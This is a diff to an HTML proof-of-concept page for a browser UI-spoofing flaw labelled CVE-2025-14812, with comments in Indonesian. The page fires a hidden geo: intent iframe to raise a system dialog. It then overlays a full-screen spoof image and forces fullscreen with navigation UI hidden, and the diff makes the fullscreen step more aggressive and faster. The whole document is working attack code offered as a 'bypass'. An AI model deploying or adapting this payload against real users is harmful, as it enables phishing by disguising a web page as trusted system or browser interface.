@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Ultimate CVE-2025-14812 Combined PoC</title>
+    <title>Ultimate Master CVE-2025-14812 & Bypass PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -52,7 +52,7 @@
       }
     </style>
     <script>
-      // Touch event handlers untuk manajemen fokus/blur input sentuh seluler
+      // Touch event handlers untuk manajemen fokus/blur input sentuh seluler tingkat lanjut
       addEventListener("touchstart", (event) => {});
       window.ontouchstart = (event) => {
         let input = document.getElementById("focusInput");
@@ -70,11 +70,11 @@
     <!-- Hidden focus management input -->
     <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />
 
-    <!-- Elemen Gambar Spoof yang menutupi seluruh layar secara penuh -->
+    <!-- Elemen Gambar Spoof yang menutupi seluruh layar secara absolut -->
     <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
 
     <div class="container" id="mainContainer">
-      <button id="execBtn">INITIALIZE ULTIMATE SPOOF & INTENT</button>
+      <button id="execBtn">INITIALIZE BYPASS & FULL SPECTRUM SPOOF</button>
       <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
@@ -83,47 +83,50 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Deploying context vectors & intent dialog...";
+        statusInfo.innerText = "Status: Deploying multi-vector bypass & intent dialog...";
         this.style.display = "none";
 
         try {
-          // 1. Memicu iframe geo: intent untuk menampilkan dialog "Open with" secara instan
+          // 1. Memicu iframe geo: intent untuk memunculkan dialog sistem secara instan menutupi status bar
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
           spoofFrame.src = "geo:0,0?q=apple.com";
           document.body.appendChild(spoofFrame);
 
-          statusInfo.innerText = "Status: Dialog triggered. Activating visual overlay & fullscreen in 2s...";
+          statusInfo.innerText = "Status: Dialog active. Deploying visual overlay & locking screen...";
 
-          // 2. Menampilkan gambar spoof secara instan di latar belakang dialog
+          // 2. Memunculkan elemen gambar spoof secara penuh di atas lapisan dialog
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          // 3. Eksekusi Fullscreen dengan navigasi tersembunyi setelah jeda 2 detik untuk mengunci layar penuh
+          // 3. Eksekusi Fullscreen agresif dengan navigasi tersembunyi setelah jeda 2 detik untuk mengunci tampilan
           setTimeout(() => {
             let docElement = document.documentElement;
             
-            if (docElement.requestFullscreen) {
-              docElement.requestFullscreen({ navigationUI: "hide" }).catch((err) => {
-                console.debug("Fullscreen restricted:", err.message);
+            let requestFS = docElement.requestFullscreen || 
+                            docElement.webkitRequestFullscreen || 
+                            docElement.mozRequestFullScreen || 
+                            docElement.msRequestFullscreen;
+
+            if (requestFS) {
+              requestFS.call(docElement, { navigationUI: "hide" }).catch((err) => {
+                console.debug("Fullscreen deferred:", err.message);
               });
-            } else if (docElement.webkitRequestFullscreen) { /* Fallback WebKit lama */
-              docElement.webkitRequestFullscreen();
             }
 
-            // Menyembunyikan elemen kontainer informasi setelah masuk fullscreen penuh
+            // Menyembunyikan kontainer tombol awal secara permanen
             let container = document.getElementById("mainContainer");
             if (container) {
               container.style.display = "none";
             }
             
-            statusInfo.innerText = "Status: Ultimate Fullscreen active & UI locked over dialog state.";
-          }, 700);
+            statusInfo.innerText = "Status: Bypass sequence complete. Fullscreen overlay locked.";
+          }, 300);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Execution error: " + err.message;
+          statusInfo.innerText = "Status: Critical execution error: " + err.message;
           execButton.style.display = "block";
         }
       };
